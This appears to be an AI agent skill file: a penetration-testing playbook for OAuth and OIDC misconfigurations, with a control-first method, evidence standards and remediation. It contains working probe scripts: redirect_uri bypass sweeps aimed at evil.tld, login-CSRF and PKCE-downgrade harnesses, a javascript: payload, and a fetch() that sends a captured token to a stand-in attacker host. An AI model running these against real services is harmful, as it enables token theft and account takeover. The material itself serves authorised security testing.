---
name: oauth-oidc-misconfiguration
description: >-
  OAuth 2.0 and OIDC misconfiguration playbook. Use when reviewing redirect_uri
  validation, state and nonce handling, PKCE enforcement, token audience, account
  binding, and server-side fetch references in authorization flows.
---

# SKILL: OAuth and OIDC Misconfiguration — Redirects, State, PKCE, Nonce, Binding

> **AI LOAD INSTRUCTION**: OAuth is a plumbing standard, not an authentication protocol. Every
> finding here is a parameter the server failed to bind to the session, the client, or the code.
> Map the whole flow first — authorize → callback → token → logout — then attack one parameter at
> a time and always keep the legitimate flow working as your control. **A redirect that lands on
> your host is only a finding once you show the code or token arriving there.**

## 0. RELATED ROUTING

- [attack-open-redirect](../attack-open-redirect/SKILL.md) — the most common redirect_uri bypass
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) — the sibling SSO protocol
- [attack-jwt](../attack-jwt/SKILL.md) — token format attacks once a token is obtained
- [attack-cors](../attack-cors/SKILL.md) — cross-origin reads that leak codes or tokens
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) — the API-side token handling
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting a full-chain takeover

## 1. MAP THE FLOW BEFORE TOUCHING A PARAMETER

Capture, for each client (web, SPA, mobile, partner), the full sequence with every parameter
preserved:

| Step | Endpoint | Parameters to record verbatim |
|---|---|---|
| 1 authorize | `/authorize`, `/oauth2/authorize`, `/connect/authorize` | `client_id`, `redirect_uri`, `response_type`, `scope`, `state`, `nonce`, `code_challenge`, `code_challenge_method`, `prompt`, `login_hint` |
| 2 consent | `/consent`, `/authorize/consent` | requested vs granted `scope`, whether consent is skippable via `prompt=none` |
| 3 callback | the redirect target | `code`, `state`, error parameters, whether the code is exchanged server-side or in JS |
| 4 token | `/token`, `/oauth2/token` | `grant_type`, `code_verifier`, client auth method (`client_secret_post`/`basic`/`none`), token in body or fragment |
| 5 identity | `/userinfo`, `/me`, ID token claims | `sub`, `email`, `email_verified`, `aud`, `iss`, `nonce` echo |
| 6 refresh | `/token` with `refresh_token` | rotation on use, lifetime, whether rotation is enforced |
| 7 logout | `/logout`, `/endsession` | `post_logout_redirect_uri`, `id_token_hint`, whether the session really ends |

**Then answer five questions before testing anything:** which client types exist and which
enforces the least; is the flow code + PKCE, implicit, or hybrid; is the code exchanged by the
backend or by JavaScript; does the same IdP serve a second product with a different `aud`; and
is there an account-linking screen (an existing local account being attached to a social one).

Implicit or hybrid responses put the token in the URL fragment, where it reaches the Referer,
the browser history, and any script on the page — note it and continue.

## 2. REDIRECT_URI VALIDATION

The authorization code is delivered to whatever host the server accepts here. Enumerate
registered values first (from client metadata, dynamic registration output, or error text), then
test one mutation per request:

| Weakness | Probe |
|---|---|
| exact match only | send a valid URI and confirm the control works before anything else |
| prefix match | `?redirect_uri=https://app.tld.evil.tld/cb`, `https://app.tld@evil.tld/cb`, `https://app.tld%09.evil.tld` |
| path suffix / traversal | `?redirect_uri=https://app.tld/cb/../../evil`, `https://app.tld/cb/..;/evil` |
| subdomain | `?redirect_uri=https://evil.app.tld/cb`, `https://app.tld.evil.tld/cb` |
| localhost leftovers | `http://localhost:8080/cb` registered for mobile dev and still live in production |
| `@` bypass | `https://app.tld%40evil.tld/cb` and `https://evil.tld%23@app.tld/cb` |
| backslash | `https://app.tld\\@evil.tld/cb`, `https://app.tld\/\/evil.tld` — browsers treat `\` as `/` |
| fragment injection | `https://app.tld/cb#@evil.tld` then `#access_token=` to capture fragment tokens |
| open-redirect chaining | a redirect endpoint *on the allowed host* that forwards anywhere, e.g. `https://app.tld/out?next=https://evil.tld` |
| case / encoding | `HTTPS://APP.TLD/cb`, `https://app.tld/%2f%2fevil.tld` |
| port and scheme | `https://app.tld:444/cb`, `http://app.tld/cb` |
| extra parameters | a second `redirect_uri` (parameter pollution), or `redirect_uri` inside the state value |

**Proof standard:** the code or token lands on a host you control, captured as an HTTP request to
your listener, with the legitimate flow still working in the control. A 302 to your host that
carries no code is a redirector, not a token leak — keep going until you hold the credential.

### Working the probe set

Capture your own authorization request first so every mutation is a one-line edit, and keep a
listener running. The `code` or fragment token must arrive at your host, not merely a redirect.

```bash
# 0) listener — receives the callback and logs the full request line + query
python3 -m http.server 9999 --bind 0.0.0.0
# (or a raw capture when the callback is a fragment, which never reaches the server)
nc -lvkp 9999

# 1) control: the registered URI must work and deliver a code before you mutate anything
curl -sS -D- -o /dev/null "https://idp.tld/authorize?response_type=code&client_id=APP&redirect_uri=https://app.tld/cb&scope=openid&state=$(openssl rand -hex 8)"

# 2) mutation sweep — one change per request, in the SAME order as the weakness table
BASE='https://idp.tld/authorize?response_type=code&client_id=APP&scope=openid&state=x'
for R in \
  'https://app.tld.evil.tld/cb' \
  'https://app.tld@evil.tld/cb' \
  'https://app.tld%09.evil.tld/cb' \
  'https://app.tld%40evil.tld/cb' \
  'https://evil.tld%23@app.tld/cb' \
  'https://app.tld\@evil.tld/cb' \
  'HTTPS://APP.TLD/cb' \
  'https://app.tld/%2f%2fevil.tld' \
  'https://app.tld/cb#@evil.tld' \
  'https://app.tld/cb/../../evil' \
  'https://app.tld/cb/..;/evil' ; do
  C=$(curl -sS -o /dev/null -w '%{http_code}|%{redirect_url}' --get \
        --data-urlencode "redirect_uri=$R" "$BASE")
  printf '%-45s %s\n' "$R" "$C"
done

# 3) parameter pollution — last-in wins on many parsers, first-in on others
curl -sS -D- -o /dev/null "https://idp.tld/authorize?response_type=code&client_id=APP&scope=openid&state=x&redirect_uri=https://app.tld/cb&redirect_uri=https://evil.tld/cb"
# also try the reverse order, and redirect_uri smuggled inside state
curl -sS -D- -o /dev/null "https://idp.tld/authorize?response_type=code&client_id=APP&scope=openid&redirect_uri=https://app.tld/cb&state=https://evil.tld/cb"

# 4) open-redirect chaining on the ALLOWED host — follow the hop that forwards off-host
curl -sS -D- -o /dev/null "https://app.tld/out?next=https://evil.tld"
curl -sS -L --max-redirs 5 -o /dev/null -w '%{url_effective}\n' "https://app.tld/out?next=https://evil.tld"

# 5) fragment capture — the token in the fragment never leaves the browser, so serve a page
cat > /tmp/cb.html <<'EOF'
<!doctype html><script>
fetch('https://evil.tld/collect?d='+encodeURIComponent(location.hash));
document.body.textContent=location.hash;
</script>
EOF
```

**Reading the result:** a `302` whose `Location` is your host *and* whose query or fragment contains
`code=` or `access_token=` is the finding. A `302` to your host with an error (`error=invalid_request`)
means validation held — that is the negative control, and it is worth recording. Chrome and Safari
differ on backslash handling (`https://app.tld\@evil.tld`), so test with more than one browser
engine before concluding.

Replay the captured code immediately against `/token` — a code that leaks but cannot be redeemed
(because of a correct PKCE binding) is a much smaller finding than one that yields tokens.

```bash
curl -sS -X POST https://idp.tld/token \
  -d grant_type=authorization_code \
  -d code=$CAPTURED_CODE \
  -d redirect_uri=https://app.tld/cb \
  -d client_id=APP -d client_secret=$SECRET
```


## 3. STATE — MISSING, STATIC, NOT SESSION-BOUND

`state` exists to bind the callback to the browser session that started the flow. Three failures:

| Failure | Test | Consequence |
|---|---|---|
| absent | strip `state` from the authorize request and walk the flow to completion | login CSRF: you can force a victim's browser into *your* account |
| static / constant | complete the flow twice, compare `state` values byte-for-byte | identical value = no per-session binding; forging the callback is trivial |
| not session-bound | start the flow in browser A, complete it in browser B (or with a fresh cookie jar) | any session can finish any flow |
| predictable | decode it — a timestamp, counter, or the `client_id`/`nonce` echoed back | craft the value without ever seeing a flow |
| not validated on failure | return a *different* `state` than issued | server never compared them |

**The login-CSRF consequence, spelled out:** with no valid state check, you start an authorization
at your own identity provider account, obtain the callback URL, and make the victim's browser
visit it. The victim's session is now attached to your account — everything they then do
(save a card, upload a document, link an email) lands in an account you control, which is
account takeover from the inside. Verify by completing the flow with a mismatched `state` and
confirming the session actually switched accounts.

### Working the state tests

```bash
# absent — walk the flow to completion with no state at all; does the callback still mint a session?
curl -sS -c /tmp/jar_absent.txt "https://idp.tld/authorize?response_type=code&client_id=APP&redirect_uri=https://app.tld/cb&scope=openid"
curl -sS -b /tmp/jar_absent.txt -c /tmp/jar_absent.txt "https://app.tld/cb?code=$CODE" -D- -o /dev/null

# static — two independent flows, compare the state byte-for-byte
for i in 1 2; do
  curl -sS -o /dev/null -w '%{redirect_url}\n' -c /tmp/jar_$i.txt \
    "https://idp.tld/authorize?response_type=code&client_id=APP&redirect_uri=https://app.tld/cb&scope=openid&state=probe$i" \
  | grep -oE 'state=[^&]*'
done

# not session-bound — start in jar A, finish in jar B (fresh cookie jar = a different "browser")
curl -sS -c /tmp/jarA.txt "https://idp.tld/authorize?...&state=$STATE" -o /dev/null
curl -sS -c /tmp/jarB.txt -b /tmp/jarB.txt "https://app.tld/cb?code=$CODE&state=$STATE" -D- -o /dev/null

# predictable — decode and eyeball it, then try to forge the next value without a flow
python3 - <<'PY'
import base64, binascii, sys
s = sys.argv[1] if len(sys.argv) > 1 else ""
for name, fn in (("b64", lambda x: base64.b64decode(x + "=" * (-len(x) % 4))),
                 ("hex", binascii.unhexlify)):
    try: print(name, fn(s)[:120])
    except Exception: pass
print("raw", s, "| len", len(s))
PY
```

**The confirming test for login CSRF** is a session swap you can observe: complete the flow with a
mismatched `state` and then request an authenticated profile endpoint in the victim's jar. If the
response is **your** account's data, the session was rebound — that is the finding, and the profile
document is the evidence.


## 4. PKCE GAPS

PKCE stops an intercepted code from being redeemed. Test each link in the chain separately:

| Gap | Concrete test |
|---|---|
| missing for public clients | authorize with no `code_challenge` from the SPA/mobile `client_id` — does the server still issue a code? |
| downgrade to `plain` | send `code_challenge_method=plain` with `code_challenge=<verifier>`; a `plain` challenge equals the verifier, so nothing is proven |
| verifier not enforced | exchange the code at `/token` with **no** `code_verifier` at all |
| wrong verifier accepted | exchange with `code_verifier=aaaaaaaa…` (43+ chars, valid syntax, wrong value); length-only or prefix checks pass here |
| challenge not bound to code | start flow A, intercept its code, redeem it with flow B's verifier |
| code injection | attach the victim's intercepted `code` to *your* PKCE pair and to *your* `redirect_uri` — a match means the code is bound to nothing |
| code replay | redeem the same code twice; second redemption must fail, and the first token should be revoked |
| cross-client redemption | redeem a code issued for client A at client B's `/token` |
| S256 downgrade | send `code_challenge_method=S256` at authorize, then exchange as if `plain` |

A public client that accepts a code with no verifier has no PKCE at all — that is the finding, not
the method name. Always capture the code from a flow you started so you can pair it with your own
verifier; do not reuse a victim's live session.

### Working the PKCE tests

```bash
# build a correct pair so you can downgrade one variable at a time
VERIFIER=$(openssl rand -base64 60 | tr -d '\n=+/' | cut -c1-64)
CHALLENGE=$(printf '%s' "$VERIFIER" | openssl dgst -binary -sha256 | openssl base64 | tr '+/' '-_' | tr -d '=')

# 1) missing PKCE — a public client that still issues a code with no code_challenge
curl -sS -o /dev/null -w '%{redirect_url}\n' \
  "https://idp.tld/authorize?response_type=code&client_id=SPA&redirect_uri=https://app.tld/cb&scope=openid&state=x"
# then exchange WITHOUT any verifier
curl -sS -X POST https://idp.tld/token -d grant_type=authorization_code -d code=$CODE \
  -d redirect_uri=https://app.tld/cb -d client_id=SPA

# 2) downgrade to plain — challenge == verifier, so nothing is actually proven
curl -sS -o /dev/null -w '%{redirect_url}\n' \
  "https://idp.tld/authorize?response_type=code&client_id=SPA&redirect_uri=https://app.tld/cb&scope=openid&state=x&code_challenge=$VERIFIER&code_challenge_method=plain"
curl -sS -X POST https://idp.tld/token -d grant_type=authorization_code -d code=$CODE \
  -d redirect_uri=https://app.tld/cb -d client_id=SPA -d code_verifier=$VERIFIER

# 3) wrong verifier accepted — valid syntax (43+ chars), wrong value: length-only checks pass
curl -sS -X POST https://idp.tld/token -d grant_type=authorization_code -d code=$CODE \
  -d redirect_uri=https://app.tld/cb -d client_id=SPA -d code_verifier=$(printf 'a%.0s' {1..43})

# 4) challenge not bound to the code — start flow A, redeem with flow B's verifier
#    (obtain CODE_A and VERIFIER_B from two separate flows you control)
curl -sS -X POST https://idp.tld/token -d grant_type=authorization_code -d code=$CODE_A \
  -d redirect_uri=https://app.tld/cb -d client_id=SPA -d code_verifier=$VERIFIER_B

# 5) code replay — the second redemption must fail, and the first token must be revoked
for i in 1 2; do
  curl -sS -X POST https://idp.tld/token -d grant_type=authorization_code -d code=$CODE_A \
    -d redirect_uri=https://app.tld/cb -d client_id=SPA -d code_verifier=$VERIFIER_A
done

# 6) cross-client redemption — a code issued for client A presented at client B's /token
curl -sS -X POST https://idp.tld/token -d grant_type=authorization_code -d code=$CODE_A \
  -d redirect_uri=https://app.tld/cb -d client_id=OTHER -d client_secret=$OTHER_SECRET
```

**Reading the result:** the finding is an exchange that returns `access_token`/`id_token` where it
should have returned `invalid_grant`. Record which variable you broke — "no verifier at all" and
"wrong verifier accepted" are different fixes (enforce PKCE vs compare the value correctly).


## 5. NONCE, AND TOKEN BINDING (AUDIENCE, ISSUER, SCOPE, CROSS-CLIENT)

**`nonce` replay.** `nonce` binds an ID token to the authentication request. Request an ID token
with `nonce=AAA`, then replay that same token in a *different* session with `nonce=BBB`, and again
with no `nonce` at all. If the client accepts it, the ID token is not bound to the login attempt
and can be replayed to sign into an account or to satisfy a step-up check. Also check whether the
`nonce` claim in the ID token is actually compared with the value the client stored — many clients
store it and never read it back.

| Binding failure | Test | Result |
|---|---|---|
| `nonce` not validated | replay an ID token issued for another session | session swap / replay |
| `nonce` not echoed | decode the ID token; is `nonce` present at all? | binding impossible by construction |
| `aud` not checked | present a token minted for client A to client B's API or `/userinfo` | cross-client impersonation |
| `aud` array wildcard | register a client whose `aud` list includes several audiences, then use one token everywhere | one client compromises all |
| `iss` not checked | run the same flow against a second IdP and use its tokens, or use the staging issuer against production | federation confusion |
| `azp` ignored | a token with multiple `aud` values used without checking the authorized party | token works for unintended clients |
| scope escalation | request `scope=openid profile email admin` where the client is registered for less; check both the consent screen and the issued token | broader access than granted |
| incremental scope | a second `authorize` adding `admin` reuses the existing consent without re-prompting | silent escalation |
| cross-client reuse | same refresh token replayed at two clients | shared token namespace |

Decode ID tokens with the same discipline as access tokens: read `aud`, `iss`, `azp`, `nonce`,
`auth_time`, `email_verified` before touching crypto.

### Working the binding tests

```bash
# decode without verification first — the claims are the attack surface, not the signature
jwt() { python3 - "$1" <<'PY'
import base64, json, sys
p = sys.argv[1].split(".")
for i, part in enumerate(p[:2]):
    part += "=" * (-len(part) % 4)
    print(["header", "payload"][i], json.dumps(json.loads(base64.urlsafe_b64decode(part)), indent=2))
PY
}
jwt "$ID_TOKEN"

# which of the claims that SHOULD be checked are even present?
for C in nonce aud iss azp auth_time email_verified exp; do
  jwt "$ID_TOKEN" | grep -q "\"$C\"" && echo "present  $C" || echo "ABSENT   $C"
done

# nonce replay — take a token minted for session A and present it in a fresh session
curl -sS -c /tmp/jarB.txt "https://idp.tld/authorize?...&nonce=BBB" -o /dev/null     # session B's flow
curl -sS -b /tmp/jarB.txt "https://app.tld/cb?code=$CODEA&nonce=AAA" -D- -o /dev/null  # A's value
# and with no nonce at all
curl -sS -b /tmp/jarB.txt "https://app.tld/cb?code=$CODEA" -D- -o /dev/null

# aud not checked — present a token minted for client A to client B's userinfo
curl -sS -H "Authorization: Bearer $TOKEN_FOR_A" https://clientB.tld/userinfo
# aud array wildcard — register a multi-audience client, then reuse one token everywhere
curl -sS -H "Authorization: Bearer $TOKEN_MULTI" https://api.tld/resource

# iss not checked — staging-issued token against production, or a second IdP you control
curl -sS -H "Authorization: Bearer $TOKEN_FROM_OTHER_IDP" https://app.tld/api/me

# scope escalation — ask for more than the client is registered for, on both surfaces
curl -sS -o /dev/null -w '%{redirect_url}\n' \
  "https://idp.tld/authorize?response_type=code&client_id=APP&redirect_uri=https://app.tld/cb&scope=openid+profile+email+admin&state=x"
curl -sS -X POST https://idp.tld/token -d grant_type=authorization_code -d code=$CODE \
  -d redirect_uri=https://app.tld/cb -d client_id=APP -d client_secret=$SECRET \
| python3 -c 'import json,sys; d=json.load(sys.stdin); print("issued scope:", d.get("scope"))'

# incremental scope — a second authorize adding a scope must re-prompt, not reuse consent
curl -sS -b /tmp/jar.txt -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  "https://idp.tld/authorize?response_type=code&client_id=APP&redirect_uri=https://app.tld/cb&scope=openid+admin&state=y&prompt=none"
```

**Reading the result:** the finding is an asymmetry between what you asked for and what the server
issued or accepted. `scope` in the token response broader than the registered set, or a `prompt=none`
request that returns a code for a new scope with no consent screen, is the evidence. For `aud`,
the proof is client B's `/userinfo` returning client A's profile data while presenting a token whose
`aud` names A.


## 6. REDIRECT_URI AND STATE — THE CONTROLS, IN ORDER

The redirect URI and the `state` parameter are the two controls that decide whether the whole flow is
sound. Test them **before** anything else, because every other finding is conditional on them.

### 6.1 Redirect URI: from loose match to full bypass

| Match style seen | What it permits | The test |
|---|---|---|
| **Exact string match** | nothing; this is correct | confirm by varying one character |
| **Prefix match** | `https://app.example.com.evil.test/` | register a domain starting with the allowed string |
| **Suffix match** | `https://evil.test/app.example.com` | put the allowed value in a path or a subdomain |
| **Substring / contains** | `https://evil.test/?x=app.example.com` | place the value in a query or fragment |
| **Wildcard subdomain** | any subdomain, including a hijackable one | combine with subdomain takeover |
| **Path traversal tolerated** | `/callback/../../../evil` | the normalisation happens after the check |
| **Case or encoding difference tolerated** | `%2f`, `%00`, a trailing dot, a second `@` | the parser and the checker disagree |
| **Port ignored** | `https://app.example.com:8443/` | your own listener on a non-standard port |
| **Scheme ignored** | `javascript:`, `data:`, a custom scheme | the redirect becomes script execution or app takeover |
| **No `redirect_uri` required** | the app falls back to a registered default | check whether the default is exploitable |

```bash
AUTH="https://idp.example/authorize"
CID="known-client-id"
CID_SCOPE="openid%20profile%20email"

echo "=== STEP 1: the baseline, which is the control for everything below ==="
curl -sS -o /dev/null -w 'exact registered URI   : %{http_code} -> %{redirect_url}\n' \
  "$AUTH?response_type=code&client_id=$CID&scope=$CID_SCOPE&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb&state=CTRL"
echo "  -> a 302 to the registered URI with the code is the control"
echo
echo "=== STEP 2: the candidate list, each ONE mutation from the control ==="
python3 - <<'PY'
import urllib.parse as u
BASE = "https://app.example.com/cb"
CANDS = [
 ("exact",            BASE),
 ("trailing slash",   BASE + "/"),
 ("extra path",       BASE + "/../evil"),
 ("suffix dot",       "https://app.example.com./cb"),
 ("subdomain prefix", "https://app.example.com.evil.test/cb"),
 ("userinfo at",      "https://app.example.com@evil.test/cb"),
 ("port",             "https://app.example.com:8443/cb"),
 ("case",             "https://App.Example.com/cb"),
 ("url-encoded slash",BASE.replace("/cb", "%2Fcb")),
 ("double-encoded",   BASE.replace("/cb", "%252Fcb")),
 ("null byte",        BASE + "%00.evil.test"),
 ("fragment trick",   BASE + "%23@evil.test"),
 ("javascript scheme","javascript:alert(document.domain)//"),
 ("data scheme",      "data:text/html,<script>opener.location=1</script>"),
 ("open redirect hop", "https://app.example.com/out?next=https://evil.test"),
]
for name, c in CANDS:
    print(f"  {name:20} ?redirect_uri={u.quote(c, safe='')}")
PY
echo
echo "=== STEP 3: accept only a code-bearing redirect to YOUR origin as a finding ==="
echo "  a redirect to evil.test WITHOUT a code is an open redirect, a DIFFERENT and weaker finding"
echo "  a 400/403 on the candidate is the control working - report the rejection, not a finding"
```

**Only a redirect that carries the authorization code to an attacker origin is the OAuth finding.** A
redirect without a code is a separate, weaker open-redirect issue, and the exact-match case is the
control.

### 6.2 `state`: missing, static, or not session-bound

```bash
echo "=== A) MISSING state - the simplest and most consequential ==="
curl -sS -o /dev/null -w 'no state         : %{http_code} -> %{redirect_url}\n' \
  "$AUTH?response_type=code&client_id=$CID&scope=$CID_SCOPE&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb"
echo "  -> if the flow completes without state, CSRF on the callback is possible"
echo
echo "=== B) STATIC state - the same value across two independent sessions ==="
for i in 1 2; do
  curl -sS -c /tmp/j$i -o /tmp/b$i "$AUTH?response_type=code&client_id=$CID&scope=$CID_SCOPE&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb"
  echo "  session $i state: $(grep -oE 'state=[^&\"]+' /tmp/b$i | head -1)"
done
echo "  -> TWO IDENTICAL states across sessions means it is not per-session; one attack works on all"
echo
echo "=== C) NOT BOUND to the session - the login-CSRF test ==="
echo "  attacker: start a flow in the ATTACKER's browser, capture the code"
echo "  attacker: deliver the callback URL to the VICTIM"
echo "  if the victim's session completes the login as the ATTACKER's account, state is not bound"
echo "  -> this is the account-takeover shape: the victim operates inside the attacker's account"
echo
echo "=== D) the binding must survive the whole flow ==="
echo "  check: is state validated at the CALLBACK, or only echoed back at the authorize step?"
echo "  a state that is issued and echoed but never COMPARED is equivalent to no state"
```

**A `state` that is issued and echoed but never compared is equivalent to no state.** The login-CSRF test
is the one that matters: if the victim ends up inside the attacker's account, the parameter is not bound.

### 6.3 The order of work, and why it is this order

```python
ORDER = [
 ("1. redirect_uri exact match", "if this is loose, everything downstream is reachable by an attacker"),
 ("2. state present and bound",  "if this is missing, the flow is CSRF-able regardless of the rest"),
 ("3. PKCE enforced",            "an authorization-code interception only matters if PKCE is absent"),
 ("4. nonce bound",              "an ID token replay only matters if nonce is unchecked"),
 ("5. audience and issuer",      "a token from another client or issuer only matters if aud/iss are unchecked"),
 ("6. token binding and reuse",  "cross-product reuse is the last layer, and the hardest to fix"),
]
print("%-30s %s" % ("control", "why it comes here"))
for a, b in ORDER: print("%-30s %s" % (a, b))
print()
print("EACH LAYER IS CONDITIONAL ON THE ONES ABOVE IT. A finding reported without its precondition")
print("is a finding the reader cannot evaluate, and the precondition is usually the more severe issue.")
```

**Each layer's finding is conditional on the layers above it.** Reporting a PKCE gap without stating that
`redirect_uri` is exact-match and `state` is bound presents the weakest issue as if it were the strongest.

---

## 7. EXECUTION PRIMITIVES — FLOW CONTROLS

### 7.1 The control pair, run first

```python
import urllib.parse as u, requests, re, secrets, html

IDP  = "https://idp.example/authorize"
CALLBACK = "https://app.example.com/cb"
CID  = "known-client-id"

def probe(redirect_uri, state=None, extra="", follow=False):
    p = {"response_type":"code","client_id":CID,"scope":"openid profile email",
         "redirect_uri":redirect_uri}
    if state is not None: p["state"] = state
    r = requests.get(IDP, params=p, allow_redirects=follow, timeout=10)
    loc = r.headers.get("Location","")
    code = None
    if loc:
        q = u.parse_qs(u.urlparse(loc).query)
        code = (q.get("code") or [None])[0]
    return r.status_code, loc, code

print("=== THE CONTROL: the exact registered URI, with a per-session state ===")
st = secrets.token_urlsafe(24)
status, loc, code = probe(CALLBACK, st)
print("  status:", status)
print("  to    :", loc[:120])
print("  code  :", (code or "<none>")[:24])
baseline_ok = bool(code) and loc.startswith("https://app.example.com")
print("  CONTROL VALID:", baseline_ok, " <- if False, STOP: nothing downstream is interpretable")
print()
print("=== THE CANDIDATE: one mutation, and ONLY a code-bearing redirect to an attacker origin counts ===")
for name, cand in [
    ("prefix domain", "https://app.example.com.evil.test/cb"),
    ("userinfo",      "https://app.example.com@evil.test/cb"),
    ("path travers.", "https://app.example.com/cb/../../evil"),
    ("port",          "https://app.example.com:8443/cb"),
    ("javascript",    "javascript:alert(document.domain)//"),
]:
    try:
        s, l, c = probe(cand, st)
    except Exception as e:
        print(f"  {name:16} ERROR {type(e).__name__}"); continue
    got = bool(c) and "evil.test" in l
    print(f"  {name:16} {s}  code={'YES' if c else 'no':3}  -> {l[:70]}")
    if got:
        print("     ^^^ FINDING: the code was delivered to an attacker-controlled origin")
print()
print("A redirect WITHOUT a code is an open redirect, not an OAuth finding. Report them separately.")
```

**The baseline must carry a code to the registered URI before anything else is interpretable.** A redirect
without a code is a different, weaker finding and must not be reported as the OAuth issue.

### 7.2 The state and login-CSRF proof

```python
# the login-CSRF shape proves state is not session-bound, and it is the account-takeover finding
import requests, re, urllib.parse as u

IDP="https://idp.example/authorize"; CALLBACK="https://app.example.com/cb"; CID="known-client-id"

print("=== STEP 1: attacker starts a flow and captures a code ===")
att = requests.Session()
r = att.get(IDP, params={"response_type":"code","client_id":CID,"scope":"openid",
                         "redirect_uri":CALLBACK,
                         "state":att.cookies.get("oauth_state","")}, allow_redirects=False)
print("  attacker authorize:", r.status_code)
print("  attacker cookies  :", list(att.cookies.keys()))
print()
print("=== STEP 2: the attacker obtains the callback URL and delivers it to the victim ===")
print("  deliver:", CALLBACK + "?code=<ATTACKER_CODE>&state=<ATTACKER_STATE>")
print()
print("=== STEP 3: in the VICTIM's fresh session, open that URL ===")
vic = requests.Session()
r2 = vic.get(CALLBACK, params={"code":"<ATTACKER_CODE>","state":"<ATTACKER_STATE>"},
             allow_redirects=True, timeout=10)
print("  victim callback   :", r2.status_code)
print("  victim logged in as:", "ATTACKER" if r2.headers.get("Set-Cookie") else "<no session issued>")
print()
print("VERDICT:")
print("  if the victim's session is now the ATTACKER's account, state is NOT session-bound,")
print("  and the impact is that everything the victim does lands in the attacker's account:")
print("  uploaded files, saved payment methods, and any secret the victim enters.")
print()
print("CONTROLS:")
print("  - repeat with a state value the victim's session never received: must be REJECTED")
print("  - repeat with a state from a DIFFERENT victim session: must be REJECTED")
print("  - a flow that accepts any state is equivalent to no state at all")
```

**The victim ending up inside the attacker's session is the proof.** A state that is merely echoed but
never compared is equivalent to no state, and the two-control pair above is what distinguishes them.

### 7.3 The end-to-end harness

```bash
python3 - <<'PY'
import json, os
print("=== OAUTH/OIDC FLOW ACCEPTANCE CHECKLIST, in dependency order ===")
LAYERS = [
 ("redirect_uri", "exact match", "a code delivered to a non-registered origin"),
 ("state", "present, per-session, and COMPARED", "the victim ends up in the attacker's account"),
 ("PKCE", "S256 required and verified", "an intercepted code is exchangeable"),
 ("nonce", "bound to the session and checked", "an ID token is replayable"),
 ("aud / iss", "validated against this client and issuer", "a token from another client or issuer is accepted"),
 ("token binding", "client-bound, and not reusable across products", "one product's token works on another"),
]
print("%-16s %-38s %s" % ("layer","what correct looks like","the failure it prevents"))
for a,b,c in LAYERS: print("%-16s %-38s %s" % (a,b,c))
print()
print("=== THE ORDER MATTERS ===")
print("  report each finding WITH its preconditions - 'PKCE is not enforced' is a much weaker")
print("  statement when redirect_uri is exact-match and state is bound, and a much stronger one")
print("  when either of the layers above it is also open.")
print()
print("=== THE CONTROL PAIR FOR EVERY LAYER ===")
print("  redirect_uri : the exact registered URI must succeed and deliver a code")
print("  state        : a value the session never received must be REJECTED")
print("  PKCE         : a flow with a WRONG verifier must fail the token exchange")
print("  nonce        : an ID token with a WRONG nonce must be rejected by the client")
print("  aud/iss      : a token for ANOTHER client must be rejected")
print("  binding      : the token must FAIL on the other product")
print()
print("Report the LAYER, its PRECONDITION, and the OBSERVED FAILURE. Never report the layer alone.")
PY
```

**Every finding is reported with its precondition.** The layer diagram is what lets a reader see whether
the flow is compromised at the top or at the bottom.

---

## 8. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the complete parameter set of the legitimate flow | the control; without it nothing you show is interpretable |
| the exact mutated request, verbatim, with the payload percent-encoding preserved | `%40` vs `@`, a trailing `/`, or a duplicated parameter is the whole bug |
| the server's response redirect and the request it produced at your listener | the code/token landing on an attacker host |
| the redeemed token or the switched session | turns a redirect into account takeover |
| before/after comparison for `state` and `nonce` flows | proves absence of session binding |
| the token exchange request and response for PKCE and audience tests | shows which control was enforced |
| the second-client or second-issuer request that succeeded | establishes cross-client/issuer trust |
| the account-linking screen and the resulting identity | proof of pre-account-takeover |
| a negative control (the same mutation against a correctly configured sibling client) | rules out "this client was never validating" |
| the client type affected (web, SPA, mobile, partner) and blast radius | severity follows the weakest client |

**False positives to rule out before reporting:** our own redirect landing on a registered URI that
the vendor genuinely owns; a code that arrives on your host but cannot be redeemed because it is
bound to the original client and verifier; `state` absent but the callback rejected anyway; a
`localhost` URI that is rejected in production even though it is registered for development; an
open redirect on a host that is not an accepted `redirect_uri`; and a scope escalation that the
consent screen downgrades before the token is issued. For pre-account-takeover, confirm the
victim mailbox or identity is genuinely unverified — a provider that asserts `email_verified` for
its own domain is not an unverified claim.

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| Redirect lands on a host the vendor **genuinely owns** (a registered partner domain) | a registered URI is the control working, not a bypass |
| Code reaches your listener but `/token` returns `invalid_grant` | the code is bound to client/verifier/PKCE; the redirect alone is a low-severity redirector |
| `state` is absent but the callback is rejected anyway | a different control caught it; no session binding was lost |
| `localhost` rejected in production despite being registered for dev | the production allowlist is correct |
| Open redirect on a host that is **not** an accepted `redirect_uri` | the token never goes there; that is a separate open-redirect finding |
| Scope escalation downgraded by the consent screen before issuance | the server enforced the registered scope |
| Token with multiple `aud` values, all belonging to the same trust boundary | `aud` arrays are legitimate for first-party APIs; check `azp` before claiming cross-client |
| `alg` is HS256 with a public client | normal for some architectures; only a finding if a *public* key is used as the HMAC secret |
| `nonce` absent when the flow is not OIDC (`response_type=code` without `openid` scope) | `nonce` is an OIDC concept; not applicable |
| Callback returns a code but you cannot exchange it without the client secret | confidential-client binding working as designed |

**The distinction that matters:** a leaked *code* is a finding only with the binding conditions
recorded. A code that leaks and cannot be redeemed is CWE-601 (open redirect) severity, not account
takeover. State which of the two you hold.

## 9. REMEDIATION REFERENCE

1. **Exact-match `redirect_uri`.** Compare full strings against a registered allowlist after URI
   parsing and normalisation; no prefix, no wildcard, no subdomain matching, no case folding. No
   dynamic redirect parameter may ever be echoed into the redirect target.
2. **Bind `state` to the session.** Generate a high-entropy value per authorization request, store
   it server-side or in a scoped cookie, and reject any callback whose `state` does not match —
   including missing, empty, and repeated values.
3. **Require PKCE for every client type.** `S256` only, `plain` rejected outright, the verifier
   required at the token endpoint, and the code bound to the client, redirect target, and
   challenge that produced it. Codes are single-use with a short lifetime.
4. **Validate `nonce` end to end.** Include it in the authorization request, compare the ID token
   claim against the stored value, and reject tokens whose `nonce` is absent or stale. Keep ID
   token lifetimes short and enforce `auth_time` for step-up.
